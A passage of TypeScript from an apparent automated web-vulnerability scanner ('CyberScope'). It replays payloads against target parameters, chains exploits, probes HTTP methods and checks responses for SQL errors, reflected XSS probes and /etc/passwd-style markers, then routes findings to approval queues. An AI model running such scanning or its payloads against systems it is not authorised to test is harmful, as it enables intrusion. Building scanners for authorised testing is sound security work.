                    await log(db, targetId, taskId, "result", `⛓️ Chain "${chain.name}" completed: ${successSteps}/${chainEvidence.length} steps produced interesting results | Impact: ${chain.impact}`);
                  } else {
                    await log(db, targetId, taskId, "info", `⛓️ Chain "${chain.name}" unsuccessful — target defended against chain`);
                  }
                }

                if (chainSuccessCount > 0) {
                  await log(db, targetId, taskId, "result", `⛓️ Exploit Chaining: ${chainSuccessCount}/${chains.length} chains produced results`);
                }

                // Log logic flaws
                for (const flaw of (reasoning.logicFlaws || []).slice(0, 3)) {
                  await log(db, targetId, taskId, "result", `🧩 Logic Flaw: ${flaw}`);
                }

                // Execute AI-generated follow-up tests
                let followUpHits = 0;
                for (const test of (reasoning.followUpTests || []).slice(0, 5)) {
                  if (isTimedOut()) break;
                  if (!isSafePayload(test.payload)) continue;

                  const matchEp = endpoints?.find(ep => {
                    const params = (ep.parameters as Record<string, string>) || {};
                    return Object.keys(params).some(p => p.toLowerCase() === test.paramName.toLowerCase());
                  });
                  if (!matchEp) continue;

                  await log(db, targetId, taskId, "action", `🎯 AI Follow-up: Testing ${test.paramName} for ${test.vulnClass} — ${test.reasoning.slice(0, 80)}`);

                  const followResult = await runDifferentialTest(matchEp.url, test.paramName, (matchEp.parameters as Record<string,string>)?.[test.paramName] || "", test.vulnClass, test.payload);
                  if (followResult) {
                    diffResults.push(followResult);
                    if (followResult.isVulnerable) {
                      followUpHits++;
                      await log(db, targetId, taskId, "result", `🔴 AI Follow-up HIT: ${test.vulnClass} on ${test.paramName} (${followResult.confidenceScore}%) — ${test.reasoning.slice(0,60)}`);
                      experienceRecords.push({
                        target_id: targetId, tech_stack: techStack, vuln_class: test.vulnClass,
                        payload_used: test.payload, http_method: "GET",
                        response_status: followResult.mutated.status, response_length: followResult.mutated.length,
                        response_snippet: followResult.mutated.bodySnippet?.slice(0, 200) || null,
                        outcome: "confirmed", confidence_score: followResult.confidenceScore,
                        reward_score: REWARD_TABLE["true_positive_confirmed"] || 10,
                        metadata: { source: "ai_reasoning_loop", reasoning: test.reasoning },
                      });
                    }
                  }
                  await new Promise(r => setTimeout(r, 100));
                }

                if (followUpHits > 0) {
                  await log(db, targetId, taskId, "result", `🧠 AI Reasoning Loop: ${followUpHits} new vulnerabilities from follow-up tests + ${chainSuccessCount} exploit chains executed`);
                } else {
                  await log(db, targetId, taskId, "info", `🧠 AI Reasoning Loop complete — target appears hardened against follow-ups`);
                }
              }
            }
          } catch (e) {
            await log(db, targetId, taskId, "error", `AI Reasoning Loop error: ${e instanceof Error ? e.message : "unknown"}`);
          }
        }
      }
    }

    // Phase 8: Batch store all experiences
    if (experienceRecords.length > 0) {
      await db.from("experience_vault").insert(experienceRecords);
      await log(db, targetId, taskId, "info", `📝 Stored ${experienceRecords.length} experiences in Memory Vault`);

      // Update strategy weights
      const weightUpdates = new Map<string, { success: number; failure: number }>();
      for (const exp of experienceRecords) {
        const key = `${techStackKey}|${exp.vuln_class}|differential`;
        const existing = weightUpdates.get(key) || { success: 0, failure: 0 };
        if (exp.outcome === "confirmed") existing.success++;
        else existing.failure++;
        weightUpdates.set(key, existing);
      }

      for (const [key, counts] of weightUpdates) {
        const [stackKey, vulnClass, toolName] = key.split("|");
        const { data: existing } = await db
          .from("strategy_weights")
          .select("*")
          .eq("tech_stack_key", stackKey)
          .eq("vuln_class", vulnClass)
          .eq("tool_name", toolName)
          .single();

        if (existing) {
          const s = (existing as any).success_count + counts.success;
          const f = (existing as any).failure_count + counts.failure;
          await db.from("strategy_weights")
            .update({ success_count: s, failure_count: f, effectiveness_pct: Math.round((s / (s + f)) * 1000) / 10 })
            .eq("id", (existing as any).id);
        } else {
          const total = counts.success + counts.failure;
          await db.from("strategy_weights").insert({
            tech_stack_key: stackKey, vuln_class: vulnClass, tool_name: toolName,
            success_count: counts.success, failure_count: counts.failure,
            effectiveness_pct: total > 0 ? Math.round((counts.success / total) * 1000) / 10 : 50,
          });
        }
      }
      await log(db, targetId, taskId, "info", `📊 Updated ${weightUpdates.size} strategy weights`);
    }

    // ── Step 3.5: Phase 8 — Method Expansion Discovery (skip if timed out) ──
    const sampleEndpoints = endpoints.slice(0, 2);
    let methodDiscoveryCount = 0;
    if (!isTimedOut()) {
    for (const ep of sampleEndpoints) {
      if (isTimedOut()) break;
      try {
        const baseResp = await safeFetch(ep.url, { method: "GET", headers: { "User-Agent": "CyberScope-Scanner/1.0" }, redirect: "manual" }, 5000);
        const baseBody = await baseResp.text();

        const methodsToTry = ["PUT", "PATCH", "DELETE", "OPTIONS", "TRACE"];
        for (const method of methodsToTry) {
          if (isTimedOut()) break;
          try {
            const resp = await safeFetch(ep.url, { method, headers: { "User-Agent": "CyberScope-Scanner/1.0" }, redirect: "manual" }, 4000);
            const isInteresting = resp.status !== baseResp.status && resp.status !== 405 && resp.status !== 501;
            if (isInteresting) {
              await db.from("method_discoveries").insert({
                target_id: targetId, endpoint_url: ep.url, http_method: method,
                custom_headers: {}, response_status: resp.status, response_diff_pct: 0,
                is_interesting: true, notes: `${method} returned ${resp.status} (GET: ${baseResp.status})`,
              });
              methodDiscoveryCount++;
              experienceRecords.push({
                target_id: targetId, tech_stack: techStack, vuln_class: "method-discovery",
                payload_used: method, http_method: method, response_status: resp.status,
                response_length: 0, response_snippet: null, outcome: "confirmed",
                confidence_score: 70, reward_score: REWARD_TABLE["new_method_discovered"] || 8,
                metadata: { endpoint: ep.url },
              });
            }
            await new Promise((r) => setTimeout(r, 80));
          } catch { /* skip */ }
        }
      } catch { /* skip */ }
    }
    } // end if !isTimedOut()

    if (methodDiscoveryCount > 0) {
      await log(db, targetId, taskId, "result", `🔎 Method Discovery: found ${methodDiscoveryCount} interesting method variations`);
    }

    const vulnFindings = diffResults.filter((r) => r.isVulnerable);
    await log(db, targetId, taskId, "result", `Active testing found ${vulnFindings.length} potential vulnerabilities out of ${diffResults.length} tests`);

    // ── Phase 9 Step 3.7: Deterministic Proof (The Gauntlet) ──
    await log(db, targetId, taskId, "thought", "🛡️ Phase 9: Running Gauntlet — deterministic proof validation");
    let gauntletProven = 0;
    let gauntletFailed = 0;
    const proofResults = new Map<number, { proven: boolean; proofType: string; details: string; mathematicalBasis: string }>();

    for (let i = 0; i < vulnFindings.length; i++) {
      const vf = vulnFindings[i];
      const proofEvidence = {
        responseBody: vf.mutated.bodySnippet || "",
        baselineBody: vf.baseline.bodySnippet || "",
        responseTime: 0,
        baselineTime: 0,
        statusCode: vf.mutated.status,
        baselineStatus: vf.baseline.status,
        headers: vf.mutated.headers || {},
      };

      // Run deterministic proof checks inline
      let proven = false;
      let proofType = "unsupported";
      let details = "No deterministic proof available";
      let mathBasis = "N/A";

      if (vf.vulnClass === "sqli" || vf.vulnClass === "auth-bypass") {
        const sqlErrors = [/sql syntax/i, /ORA-\d+/i, /SQLSTATE/i, /pg_query/i, /unclosed quotation/i];
        if (sqlErrors.some(p => p.test(vf.mutated.bodySnippet || "") && !p.test(vf.baseline.bodySnippet || ""))) {
          proven = true; proofType = "error_based"; mathBasis = "DB error string in mutated response only";
        }
      } else if (vf.vulnClass === "rxss" || vf.vulnClass === "stored-xss") {
        const probes = ["<cyberscope>", "<svg onload=", "onerror=cyberscope"];
        if (probes.some(p => (vf.mutated.bodySnippet || "").includes(p))) {
          proven = true; proofType = "xss_reflection"; mathBasis = "Probe reflected unescaped";
        }
      } else if (vf.vulnClass === "cmdi") {
        if (/cyberscope_marker|uid=\d+\(|root:.*:0:0/.test(vf.mutated.bodySnippet || "")) {
          proven = true; proofType = "cmd_output"; mathBasis = "Command execution marker found";
        }
      } else if (vf.vulnClass === "ssti") {
        if (/\b49\b/.test(vf.mutated.bodySnippet || "") && !/\b49\b/.test(vf.baseline.bodySnippet || "")) {
          proven = true; proofType = "template_eval"; mathBasis = "7*7=49 evaluated";
        }
      } else if (vf.vulnClass === "path-traversal" || vf.vulnClass === "lfi") {
        if (/root:.*:0:0|\/bin\/bash/.test(vf.mutated.bodySnippet || "")) {
          proven = true; proofType = "file_leak"; mathBasis = "System file content detected";
        }
      }

      if (!proven) details = `No deterministic proof for ${vf.vulnClass}`;
      else details = mathBasis;

      proofResults.set(i, { proven, proofType, details, mathematicalBasis: mathBasis });
      if (proven) gauntletProven++; else gauntletFailed++;
    }

    await log(db, targetId, taskId, "result", `🛡️ Gauntlet: ${gauntletProven} proven, ${gauntletFailed} unproven out of ${vulnFindings.length} findings`);

    // ── Phase 9 Step 3.8: Peer Review (Skeptic Agent) ──
    await log(db, targetId, taskId, "thought", "🤔 Phase 9: Spawning Reviewer Agents for peer review");
    let peerUpheld = 0;
    let peerDisputed = 0;
    const peerResults = new Map<number, { verdict: string; skepticScore: number; finalConfidence: number; reasoning: string }>();

    for (let i = 0; i < vulnFindings.length; i++) {
      const vf = vulnFindings[i];
      const challenges: Array<{ type: string; severity: string; argument: string }> = [];

      // Honeypot check
      const bodyStr = vf.mutated.bodySnippet || "";
      if (["trap", "honeypot", "canary", "deception"].some(p => bodyStr.toLowerCase().includes(p))) {
        challenges.push({ type: "honeypot", severity: "critical", argument: "Response contains deception indicators" });
      }
      // WAF interference
      if (["cloudflare", "akamai", "incapsula"].some(w => bodyStr.toLowerCase().includes(w))) {
        challenges.push({ type: "waf_interference", severity: "major", argument: "WAF detected in response" });
      }
      // Status-confidence mismatch
      if (vf.mutated.status >= 400 && vf.confidenceScore > 70) {
        challenges.push({ type: "status_mismatch", severity: "major", argument: `HTTP ${vf.mutated.status} with ${vf.confidenceScore}% confidence` });
      }
      // XSS escaped check
      if ((vf.vulnClass === "rxss") && bodyStr.includes("&lt;")) {
        challenges.push({ type: "escaped_reflection", severity: "critical", argument: "Payload is HTML-escaped" });
      }

      const skepticScore = Math.min(100, challenges.reduce((acc, c) => acc + (c.severity === "critical" ? 35 : c.severity === "major" ? 20 : 10), 0));
      const finalConfidence = Math.max(0, Math.min(100, vf.confidenceScore - (skepticScore * 0.6)));
      const verdict = challenges.some(c => c.severity === "critical") ? "disputed" : skepticScore > 40 ? "needs_retest" : "upheld";

      peerResults.set(i, {
        verdict,
        skepticScore,
        finalConfidence,
        reasoning: challenges.length > 0 ? `${challenges.length} concern(s): ${challenges.map(c => c.type).join(", ")}` : "No concerns — finding legitimate",
      });

      if (verdict === "upheld") peerUpheld++; else peerDisputed++;
    }

    await log(db, targetId, taskId, "result", `🤔 Peer Review: ${peerUpheld} upheld, ${peerDisputed} disputed/needs-retest`);

    // ── Step 4: CVE Correlation (skip if timed out) ──
    let cveResults: CveResult[] = [];
    if (!isTimedOut()) {
      await log(db, targetId, taskId, "thought", "Querying NVD for CVE correlation");
      cveResults = await queryCveDatabase(techStack);
      await log(db, targetId, taskId, "result", `CVE correlation found ${cveResults.length} potentially relevant CVEs`);
    } else {
      await log(db, targetId, taskId, "info", "⏱️ Skipping CVE correlation — time limit");
    }

    // ── Step 4.5: Intel Feed Template Cross-Reference ──
    let intelTemplatesTested = 0;
    let intelConfirmed = 0;
    if (!isTimedOut()) {
      await log(db, targetId, taskId, "thought", "🔍 Cross-referencing intel feed templates against target");
      const { data: intelFeeds } = await db.from("intel_feeds")
        .select("id, title, vulnerability_class, extracted_payloads, affected_tech_stack, test_template, matched_targets")
        .eq("status", "processed").limit(30);

      if (intelFeeds && intelFeeds.length > 0) {
        const targetTech = [
          (techStack.server || "").toLowerCase(),
          (techStack.framework || "").toLowerCase(),
          (techStack.poweredBy || "").toLowerCase(),
        ].filter(Boolean);

        for (const feed of intelFeeds) {
          if (isTimedOut()) break;
          const affectedStack = (feed.affected_tech_stack as string[]) || [];
          const stackMatch = affectedStack.some((t: string) => targetTech.some(tt => tt.includes(t.toLowerCase())));
          if (!stackMatch) continue;

          const templatePayloads = ((feed.test_template as any)?.payloads || []) as string[];
          const extractedPayloads = (feed.extracted_payloads as string[]) || [];
          const allPayloads = [...new Set([...templatePayloads, ...extractedPayloads])].slice(0, 5);
          if (allPayloads.length === 0) continue;

          const vc = feed.vulnerability_class || "sqli";
          let confirmed = false;

          for (const ep of (endpoints || []).slice(0, 3)) {
            if (isTimedOut()) break;
            const params = (ep.parameters as Record<string, string>) || {};
            for (const paramName of Object.keys(params).slice(0, 2)) {
              if (isTimedOut()) break;
              for (const payload of allPayloads.slice(0, 3)) {
                try {
                  const baseResp = await safeFetch(ep.url, { method: "GET", headers: { "User-Agent": "CyberScope/1.0" }, redirect: "manual" }, 5000);
                  const baseBody = await baseResp.text();

                  const url = new URL(ep.url);
                  url.searchParams.set(paramName, payload);
                  const mutResp = await safeFetch(url.toString(), { method: "GET", headers: { "User-Agent": "CyberScope/1.0" }, redirect: "manual" }, 5000);
                  const mutBody = await mutResp.text();

                  // Use strict execution evidence detection
                  const execCheck = analyzeExecutionEvidence(vc, payload, mutBody, baseBody);
                  if (execCheck.hasEvidence) {
                    confirmed = true;
                    intelConfirmed++;
                    await log(db, targetId, taskId, "result", `🔴 Intel template CONFIRMED: ${vc} from "${feed.title}" — ${execCheck.details}`);
                    break;
                  }
                  intelTemplatesTested++;
                  await new Promise(r => setTimeout(r, 150));
                } catch { /* skip */ }
              }
              if (confirmed) break;
            }
            if (confirmed) break;
          }

          // Tag the intel feed with confirmation status for this target
          try {
            const existingTargets = (feed.matched_targets as any[]) || [];
            const targetEntry = {
              id: targetId, domain: target.domain,
              confirmed, testedAt: new Date().toISOString(),
            };
            const updated = existingTargets.filter((t: any) => t.id !== targetId);
            updated.push(targetEntry);
            await db.from("intel_feeds").update({
              matched_targets: updated,
              rescan_triggered: confirmed || (feed as any).rescan_triggered,
            }).eq("id", feed.id);
          } catch { /* skip */ }
        }

        await log(db, targetId, taskId, "result", `🔍 Intel cross-ref: ${intelTemplatesTested} tested, ${intelConfirmed} confirmed`);
      }
    }
    let aiAssessments = { assessments: [] as any[] };
    let verifiedCount = 0;
    let falsePositiveCount = 0;
    if (!isTimedOut()) {
      await log(db, targetId, taskId, "thought", "🧠 AI verifying findings to eliminate false positives...");
      aiAssessments = await aiVerifyAndAnalyze(target.domain || "unknown", diffResults, cveResults, passiveResults, techStack);
      verifiedCount = aiAssessments.assessments.filter((a: any) => a.isVerified).length;
      falsePositiveCount = aiAssessments.assessments.filter((a: any) => !a.isVerified).length;
    } else {
      await log(db, targetId, taskId, "info", "⏱️ Skipping AI verification — time limit");
    }

    // ── Step 6: Route findings — HIGH/CRITICAL → Approvals, LOW/MEDIUM/INFO → Auto-accepted ──
    await log(db, targetId, taskId, "thought", "Routing findings: high/critical → approval queue, low/medium/info → auto-accepted findings");
    let approvalCount = 0;
    let autoAcceptedCount = 0;

    // ── Check suppression vectors ──
    const { data: suppressionVectors } = await db.from("suppression_vectors").select("*");
    const suppressedTypes = new Set((suppressionVectors || []).map((v: any) => `${v.finding_type}:${v.vuln_class || ""}`));

    // Helper: auto-accept low-severity findings directly to vulnerability_findings
    async function autoAcceptFinding(finding: {
      target_id: string; endpoint_id?: string | null; title: string; severity: string;
      description?: string; payload?: string; confidence_score?: number;
      confidence_level?: string; ai_verified?: boolean; triage_reasoning?: string;
      cvss_score?: number; reachability_status?: string;
    }) {
      await db.from("vulnerability_findings").insert({
        target_id: finding.target_id,
        endpoint_id: finding.endpoint_id || null,
        title: finding.title,
        severity: finding.severity as any,
        description: finding.description || null,
        payload: finding.payload || null,
        confidence_score: finding.confidence_score || 0,
        confidence_level: finding.confidence_level || "medium",
        ai_verified: finding.ai_verified || false,
        triage_reasoning: finding.triage_reasoning || "Auto-accepted (low/medium/info severity)",
        cvss_score: finding.cvss_score || null,
        reachability_status: finding.reachability_status || "unknown",
        validation_status: "auto-accepted",
      });
      autoAcceptedCount++;
    }

    // Passive findings → auto-accept (all are low/medium/info)
    for (const passive of passiveResults) {
      await autoAcceptFinding({
        target_id: targetId,
        title: passive.title,
        severity: passive.severity,
        description: `${passive.description}\n\n**Remediation:** ${passive.remediation}`,
        confidence_level: passive.severity === "info" ? "low" : "medium",
        ai_verified: true,
        triage_reasoning: `Passive check — deterministic detection. OWASP: ${passive.owaspCategory}`,
      });
    }

    // Active differential findings with Phase 9 proof & peer review data
    for (let idx = 0; idx < vulnFindings.length; idx++) {
      const diff = vulnFindings[idx];
      const matchingCheck = vulnChecks.find((c) => c.vulnClasses.includes(diff.vulnClass));
      const suppressKey = `active-${diff.vulnClass}:${diff.vulnClass}`;
      if (suppressedTypes.has(suppressKey)) {
        await log(db, targetId, taskId, "info", `⛔ Suppressed ${diff.vulnClass} — matches false positive pattern`);
        continue;
      }

      const proof = proofResults.get(idx);
      const peer = peerResults.get(idx);

      // ─── Rule 3: Gauntlet Supremacy ───
      // Recon -> Exploit (Gauntlet) -> AI Peer Review.
      // If Gauntlet proven=0, the finding is INSTANTLY a False Positive
      // and is dropped from the queue. AI Peer Review may NOT resurrect it.
      const attemptedCount = (diff.intruderResults?.length ?? 0) + 1; // +1 for the diff probe
      const provenCount = proof?.proven ? 1 : 0;
      const gauntletGate = applyGauntletVerdict(
        { payloads_tested: attemptedCount, confidence_score: diff.confidenceScore, severity: diff.confidence },
        { proven: provenCount, attempted: attemptedCount, evidence: proof },
      );

      if (gauntletGate.gauntlet_verdict === "false_positive") {
        await log(db, targetId, taskId, "info",
          `🛡️ Gauntlet supremacy: dropped ${diff.vulnClass} — physical proof=0 (AI peer review forbidden from resurrecting)`);
        continue;
      }

      // ─── Rule 2: Zero-Payload Hallucination Kill Switch ───
      // If no payloads were physically tested, force confidence to 0 and
      // strip severity. The UI can never render this as High/Critical.
      const gated = enforceZeroPayloadGate({
        payloads_tested: attemptedCount,
        confidence_score: diff.confidenceScore,
        severity: diff.confidence,
      });
      if (gated.validation_status === "unverified_no_payload") {
        await log(db, targetId, taskId, "info",
          `🚫 Zero-payload gate: ${diff.vulnClass} stripped to info — no physical payloads tested`);
        // continue to persist as info-only; do not skip entirely
      }

      const severityMap: Record<string, string> = { high: "high", medium: "medium", low: "low" };
      const effectiveConfidence = peer?.finalConfidence ?? diff.confidenceScore;
      const confidenceLabel = effectiveConfidence >= 80 ? "high" : effectiveConfidence >= 50 ? "medium" : "low";

      let effectiveSeverity = severityMap[diff.confidence] || "medium";
      if (effectiveSeverity === "critical" && !proof?.proven) effectiveSeverity = "high";

      // Apply the gate's severity downgrade if it triggered
      if (gated.validation_status === "unverified_no_payload") {
        effectiveSeverity = "info";
      }

      const proofNote = proof?.proven ? `\n\n🛡️ **Gauntlet Proof**: ${proof.proofType} — ${proof.mathematicalBasis}` : "\n\n⚠️ No deterministic proof — requires manual verification";
      const peerNote = peer ? `\n\n🤔 **Peer Review**: ${peer.verdict.toUpperCase()} (skeptic score: ${peer.skepticScore}) — ${peer.reasoning}` : "";
      const fullDescription = `Parameter "${matchingCheck?.paramName}" showed differential response behavior indicating possible ${diff.vulnClass}.${diff.adaptationUsed ? `\n\nAdaptive mutation "${diff.adaptationUsed}" was used.` : ""}${diff.intruderResults ? `\n\n**Intruder Results:** ${diff.intruderResults.length} payloads tested, ${diff.intruderResults.filter(i => i.status === 200).length} returned 200 OK.` : ""}${proofNote}${peerNote}`;
      const triageNote = `Gauntlet: PROVEN (${proof?.proofType || "verified"}). Peer: ${peer?.verdict || "N/A"} (skeptic: ${peer?.skepticScore || 0})`;

      // ── AI Confirmation Gate (honeypot + deterministic-proof + LLM verdict) ──
      const baseSnippet = typeof diff.baseline === "string" ? diff.baseline : JSON.stringify(diff.baseline || "").slice(0, 1500);
      const mutSnippet = typeof diff.mutated === "string" ? diff.mutated : JSON.stringify(diff.mutated || "").slice(0, 1500);
      const aiGate = await confirmFinding({
        vulnClass: diff.vulnClass,
        payload: diff.truePayload || "",
        endpoint: matchingCheck?.url || "",
        parameter: matchingCheck?.paramName,
        baseline: { status: 0, length: baseSnippet.length, bodySnippet: baseSnippet },
        mutated: { status: 0, length: mutSnippet.length, bodySnippet: mutSnippet },
        deterministicProof: !!proof?.proven,
        proofType: proof?.proofType || "differential",
      });
      if (aiGate.recommendedAction === "drop_honeypot") {
        await log(db, targetId, taskId, "info", `🍯 honeypot trap suppressed ${diff.vulnClass}: ${aiGate.reasoning}`);
        continue;
      }
      if (aiGate.recommendedAction === "drop_false_positive") {
        await log(db, targetId, taskId, "info", `🛑 AI rejected ${diff.vulnClass} (conf ${aiGate.confidence}): ${aiGate.reasoning}`);
        continue;
      }

      // Route by severity: high/critical → approvals, others → auto-accept
      if (effectiveSeverity === "high" || effectiveSeverity === "critical") {
        await db.from("pending_approvals").insert({
          target_id: targetId,
          endpoint_id: matchingCheck?.endpointId || null,
          finding_type: `active-${diff.vulnClass}`,
          severity: effectiveSeverity,
          title: `${proof?.proven ? "✅" : "⚠️"} ${diff.vulnClass.toUpperCase()} [${diff.owaspCategory}]`,
          description: `${fullDescription}\n\n**AI Gate:** ${aiGate.reasoning}`,
          parameter: matchingCheck?.paramName,
          payload_used: diff.truePayload,
          baseline_response: diff.baseline,
          mutated_response: diff.mutated,
          request_data: diff.requestData,
          response_data: diff.responseData,
          confidence_level: confidenceLabel,
          confidence_score: aiGate.confidence,
          ai_verified: true,
          ai_verification_notes: `AI gate (${aiGate.proofType}): ${aiGate.reasoning}`,
          triage_reasoning: `${triageNote}. AI gate (${aiGate.proofType}): ${aiGate.reasoning}`,
          evidence: {
            vulnClass: diff.vulnClass, confidence: diff.confidence, confidenceScore: aiGate.confidence,
            url: matchingCheck?.url, owaspCategory: diff.owaspCategory,
            adaptationUsed: diff.adaptationUsed || null, intruderResults: diff.intruderResults || null,
            gauntletProof: proof || null, peerReview: peer || null, aiGate,
            payloadsTested: attemptedCount, gauntletVerdict: gauntletGate.gauntlet_verdict,
          },
        });
        approvalCount++;
      } else {
        await autoAcceptFinding({
          target_id: targetId,
          endpoint_id: matchingCheck?.endpointId || null,
          title: `${diff.vulnClass.toUpperCase()} [${diff.owaspCategory}]`,
          severity: effectiveSeverity,
          description: `${fullDescription}\n\n**AI Gate:** ${aiGate.reasoning}`,
          payload: diff.truePayload,
          confidence_score: aiGate.confidence,
          confidence_level: confidenceLabel,
          ai_verified: true,
          triage_reasoning: `${triageNote}. AI gate (${aiGate.proofType}): ${aiGate.reasoning}`,
        });
      }
    }

    // CVE findings — AI reverification before adding
    const serverHeader = techStack.server || "";
    const LOVABLE_API_KEY_CVE = Deno.env.get("LOVABLE_API_KEY");
    for (const cve of cveResults.slice(0, 10)) {
      const versionCheck = checkVersionSanity(cve.cveId, serverHeader);
      if (versionCheck.shouldSuppress) {
        await log(db, targetId, taskId, "info", `⛔ Suppressed ${cve.cveId} — ${versionCheck.reason}`);
        continue;
      }

      // AI reverification of CVE applicability
      let cveVerified = false;
      let cveVerifyNotes = "CVE correlation — not AI verified";
      if (LOVABLE_API_KEY_CVE) {
        try {
          const verifyResp = await safeFetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
            method: "POST",
            headers: { Authorization: `Bearer ${LOVABLE_API_KEY_CVE}`, "Content-Type": "application/json" },
            body: JSON.stringify({
              model: "google/gemini-2.5-flash-lite",
              messages: [
                { role: "system", content: "You verify CVE applicability. Return JSON via tool." },
                { role: "user", content: `Does ${cve.cveId} (${cve.description.slice(0, 300)}) apply to a server with: ${JSON.stringify(techStack)}? Consider version, technology match, and whether the vulnerability is patched.` },
              ],
              tools: [{ type: "function", function: {
                name: "cve_verdict", description: "CVE applicability verdict",
                parameters: { type: "object", properties: {
                  applicable: { type: "boolean" }, confidence: { type: "number" }, reasoning: { type: "string" },
                }, required: ["applicable", "confidence", "reasoning"], additionalProperties: false },
              }}],
              tool_choice: { type: "function", function: { name: "cve_verdict" } },
            }),
          });
          if (verifyResp.ok) {
            const vData = await verifyResp.json();
            const tc = vData.choices?.[0]?.message?.tool_calls?.[0];
            if (tc) {
              const verdict = JSON.parse(tc.function.arguments);
              cveVerified = verdict.applicable;
              cveVerifyNotes = `AI Verified: ${verdict.applicable ? "APPLICABLE" : "NOT APPLICABLE"} (${verdict.confidence}%) — ${verdict.reasoning}`;
              if (!verdict.applicable && verdict.confidence >= 70) {
                await log(db, targetId, taskId, "info", `⛔ AI dismissed ${cve.cveId} — ${verdict.reasoning}`);
                continue;
              }
            }
          }
          await new Promise((r) => setTimeout(r, 200));
        } catch { /* fallback to unverified */ }
      }

      const cveSeverityMap: Record<string, string> = { CRITICAL: "critical", HIGH: "high", MEDIUM: "medium", LOW: "low" };
      const cveSev = cveSeverityMap[cve.severity] || "medium";

      await log(
        db,
        targetId,
        taskId,
        "info",
        `🧾 Advisory-only CVE signal kept out of findings: ${cve.cveId} — exploit proof required before reporting`,
        { cveId: cve.cveId, cvssScore: cve.cvssScore, aiVerified: cveVerified, notes: cveVerifyNotes },
      );
    }

    // AI-verified assessments — Rule 3: AI Peer Review is forbidden from
    // creating high/critical findings for which there is zero physical
    // payload evidence (no Gauntlet pass). Force them to info-only.
    for (const assessment of aiAssessments.assessments) {
      const confidenceLabel = assessment.confidenceScore >= 80 ? "high" : assessment.confidenceScore >= 50 ? "medium" : "low";
      const aiFinding = enforceZeroPayloadGate({
        payloads_tested: 0, // AI deep-assessments are inferred, not physically tested
        confidence_score: assessment.confidenceScore,
        severity: assessment.severity,
      });
      // AI Peer Review may not promote anything past 'info' without a Gauntlet pass.
      if (!aiReviewAllowed(aiFinding) && (assessment.severity === "high" || assessment.severity === "critical")) {
        await log(db, targetId, taskId, "info",
          `🚫 AI peer review blocked from promoting "${assessment.title}" — no Gauntlet pass / zero payloads tested`);
        assessment.severity = "info";
      }

      if (assessment.severity === "high" || assessment.severity === "critical") {
        await db.from("pending_approvals").insert({
          target_id: targetId,
          finding_type: "ai-deep-assessment",
          severity: assessment.severity,
          title: `${assessment.title} [${assessment.owaspCategory}]`,
          description: `${assessment.description}\n\n**Remediation:** ${assessment.remediation}`,
          cvss_score: assessment.cvssScore,
          confidence_level: confidenceLabel,
          ai_verified: assessment.isVerified,
          ai_verification_notes: assessment.verificationNotes,
          evidence: {
            source: "ai-deep-analysis", owaspCategory: assessment.owaspCategory,
            remediation: assessment.remediation, cvssScore: assessment.cvssScore,
            confidenceScore: assessment.confidenceScore, isVerified: assessment.isVerified,
          },
        });
        approvalCount++;
      } else {
        await autoAcceptFinding({
          target_id: targetId,
          title: `${assessment.title} [${assessment.owaspCategory}]`,
          severity: assessment.severity,
          description: `${assessment.description}\n\n**Remediation:** ${assessment.remediation}`,
          cvss_score: assessment.cvssScore,
          confidence_level: confidenceLabel,
          ai_verified: assessment.isVerified,
          triage_reasoning: assessment.verificationNotes,
        });
      }
    }

    await log(db, targetId, taskId, "info",
      `✅ Scan complete — ${approvalCount} HIGH/CRITICAL → approval queue | ${autoAcceptedCount} LOW/MEDIUM/INFO → auto-accepted | Gauntlet: ${gauntletProven} proven | Peer: ${peerUpheld} upheld`
    );


    const owaspCoverage = [...new Set([
      ...passiveResults.map((p) => p.owaspCategory),
      ...vulnFindings.map((v) => v.owaspCategory),
      ...aiAssessments.assessments.map((a) => a.owaspCategory),
    ])];

    await db.from("agent_tasks").update({
      status: "completed",
      result: {
        parameters_classified: vulnChecks.length,
        differential_tests: diffResults.length,
        vulns_found: vulnFindings.length,
        passive_issues: passiveResults.length,
        cves_matched: cveResults.length,
        ai_assessments: aiAssessments.assessments.length,
        ai_verified: verifiedCount,
        false_positives_flagged: falsePositiveCount,
        approvals_queued: approvalCount,
        auto_accepted: autoAcceptedCount,
        owasp_categories_covered: owaspCoverage,
        adaptive_mutations_used: vulnFindings.filter((v) => v.adaptationUsed).length,
        intruder_tests_run: vulnFindings.reduce((sum, v) => sum + (v.intruderResults?.length || 0), 0),
        experiences_recorded: experienceRecords.length,
        strategy_classes_disabled: disabledClasses.size,
        method_discoveries: methodDiscoveryCount,
        evolutionary_mutations: experienceRecords.filter(e => (e.metadata as any)?.mutation).length,
        gauntlet_proven: gauntletProven,
        gauntlet_failed: gauntletFailed,
        peer_upheld: peerUpheld,
        peer_disputed: peerDisputed,
      },
    }).eq("id", taskId);

    await db.from("target_workspaces").update({ status: "completed" }).eq("id", targetId);

    // ── Always auto-trigger Mythos agent post-scan + reflection-XSS sweep ──
    try {
      await db.from("scan_logs").insert({
        target_id: targetId, log_type: "info",
        message: `🧠 Auto-triggering Mythos agent + XSS reflection sweep post-scan`,
        metadata: { trigger: "post_scan_auto" },
      } as any);
      // fire-and-forget Mythos loop
      fetch(`${Deno.env.get("SUPABASE_URL")}/functions/v1/mythos-agent`, {
        method: "POST",
        headers: {
          Authorization: `Bearer ${Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ targetId, triggerType: "post_scan_auto", maxIterations: 3 }),
      }).catch((e) => console.error("mythos-agent dispatch failed:", e));

      // fire-and-forget reflection-based XSS auto-promotion (no LLM required)
      fetch(`${Deno.env.get("SUPABASE_URL")}/functions/v1/xss-reflection-promoter`, {
        method: "POST",
        headers: {
          Authorization: `Bearer ${Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ targetId }),
      }).catch((e) => console.error("xss-reflection-promoter dispatch failed:", e));

      // fire-and-forget parameter brute-force XSS sweep (XBOW/Mythos-style probing)
      fetch(`${Deno.env.get("SUPABASE_URL")}/functions/v1/param-bruteforce-xss`, {
        method: "POST",
        headers: {
          Authorization: `Bearer ${Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ targetId, maxEndpoints: 8, maxParamsPerEndpoint: 12 }),
      }).catch((e) => console.error("param-bruteforce-xss dispatch failed:", e));

      // fire-and-forget zero-day engine (SSTI, NoSQLi, prototype pollution, GraphQL, SSRF, CRLF, redirect, deserialization, host-header)
      fetch(`${Deno.env.get("SUPABASE_URL")}/functions/v1/zeroday-engine`, {
        method: "POST",
